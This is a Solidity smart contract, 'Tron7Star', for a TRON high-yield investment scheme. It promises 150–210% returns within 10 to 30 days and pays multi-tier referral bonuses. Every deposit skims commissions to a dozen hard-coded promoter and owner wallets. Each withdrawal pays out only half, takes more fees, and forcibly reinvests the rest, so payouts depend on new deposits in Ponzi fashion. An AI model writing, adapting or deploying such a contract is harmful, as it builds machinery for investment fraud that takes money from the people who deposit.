//SourceUnit: 7star1.sol

pragma solidity ^0.4.25;

contract Tron7Star {
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint referrals_tier5;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint depositCount;
    uint invested;
    uint paidAt;
    uint withdrawn;
    uint rein;
  }
  
  uint MIN_DEPOSIT = 100 trx;
  uint START_AT = 22874655;
  
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  uint public commissionDivisor = 100;
  uint public promoterCommission = 2;
  uint public promoterCommission1 = 1;
  
  address promoter1 = 0x5341e5F274AEBA0be1880497a98765B8d71124E7; ////0120
  
  address promoter2 = 0x336460f97bA94edaE93f4F6De6656A9BA99F5bA7; //Dst1 2%
  address promoter3 = 0xabD1375fC06E32b16589550E7393F92Ce76abDE1; //Dst2 1%
  address downer = 0x79EFfD21D9b68541834B544235546c1Ea2B44EB2; //Owner 1%
  address promoter4 = 0x866Ca053C5eD89f2F75bC39cb209F4A4C8E844C3; //Dst3 2%
  address promoter5 = 0x0b25DE9F8aC9Fe82578b1c08D7B213D016303dee; //Dst4 1%
  address promoter6 = 0x09C7309F5a8347670DB61c85cf99fE9259967523; //Dst5 1%
  address promoter7 = 0x126bF966E5b9912Ca6683970aAd6ee570f1D0Cd0; // Dst6 1%
  address with3 =  0x3c35c1BE9c5A4692be8cEE0FbaCaF9269426AbB5; //wd Dst7 1%
  address with4 =  0x16dd6DC49b380447Ad36099451Faa5B6156c5Ae3; //wd Dst8 1%
  address with5 =   0xd863E6D23B51f86F9a333d8a72846A9BcA3AdaDF; //wd Dst8 1%
  address  with6 =   0xE07999c2DFBB0a676cb4657ffcA6b35ce7e6e470; //wd Dst8 2%
  address with1 = 0xF964c6faefa59367125C5207d6be0f56597FdC95; //WD Dst3 2%
  address with2 = 0x8aFEE8513cda4EBd6E82E466d2204F884d1f5712; //WD Dst3 1%  
  
  
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }
          if (i == 4) {
            investors[rec].referrals_tier5++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      uint a1;
       uint a;

      if (i==4){
         a1= 2;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      if (i==3){
         a1= 1;
      a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      if (i==2){
         a1= 1;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      if (i==1){
         a1= 1;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      
       if (i==0){
         a1= 5;
          a = amount * a1 / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      rec = investors[rec].referer;
      }
      
      
    }
  }
  
  constructor() public {
     tariffs.push(Tariff(10 * 28800, 150));
     tariffs.push(Tariff(12 * 28800, 180));
     tariffs.push(Tariff(10 * 28800, 200));
    tariffs.push(Tariff(30 * 28800, 210));
    
    for (uint i = 5; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  
  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    require(investors[msg.sender].deposits.length < 200);
    
    uint promoEarn = msg.value * promoterCommission/100;
    uint promoEarn1 = msg.value * promoterCommission1/100;
    register(referer);
    //support.transfer(msg.value / 10);
    promoter1.transfer(promoEarn);
    promoter2.transfer(promoEarn);
    promoter4.transfer(promoEarn);
    
    promoter3.transfer(promoEarn1);
    promoter5.transfer(promoEarn1);
    promoter6.transfer(promoEarn1);
    promoter7.transfer(promoEarn1);
    downer.transfer(promoEarn1);
    
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    investors[msg.sender].depositCount++;
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
   function reinvest(uint tariff, address referer) internal {

    require(tariff < tariffs.length);

    uint promoEarn = investors[msg.sender].rein * promoterCommission/100;
    uint promoEarn1 = investors[msg.sender].rein * promoterCommission1/100;
    register(referer);
    //support.transfer(msg.value / 10);
    promoter1.transfer(promoEarn);
    promoter2.transfer(promoEarn);
    promoter4.transfer(promoEarn);
    
    promoter3.transfer(promoEarn1);
    promoter5.transfer(promoEarn1);
    promoter6.transfer(promoEarn1);
    promoter7.transfer(promoEarn1);
    downer.transfer(promoEarn1);
    
    rewardReferers(investors[msg.sender].rein, investors[msg.sender].referer);
    
    investors[msg.sender].invested += investors[msg.sender].rein;
    totalInvested += investors[msg.sender].rein;
    
    investors[msg.sender].deposits.push(Deposit(tariff, investors[msg.sender].rein, block.number));
    investors[msg.sender].depositCount++;
    
    emit DepositAt(msg.sender, tariff, investors[msg.sender].rein);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw() external {
    uint amount = profit();
    uint amount1 = amount/2;
    uint devComm = amount1/10;
    uint part1 = devComm/10;
    uint part2 = devComm * 20/100;
    investors[msg.sender].rein = amount1;
    msg.sender.transfer(amount1);
    with1.transfer(part2);
    with6.transfer(part2);
    with2.transfer(part1);
    with3.transfer(part1);
    with4.transfer(part1);
    with5.transfer(part1);
    promoter1.transfer(part2);
    
    investors[msg.sender].withdrawn += amount1;
    emit Withdraw(msg.sender, amount);
     reinvest(0,investors[msg.sender].referer);
    
  }
  
  function getDeposit(address investor, uint index) external view returns (uint tariff, uint amount, uint at) {
    tariff = investors[investor].deposits[index].tariff;
    amount = investors[investor].deposits[index].amount;
    at = investors[investor].deposits[index].at;
  }
  
  function via(address where) external payable {
    where.transfer(msg.value);
  }
}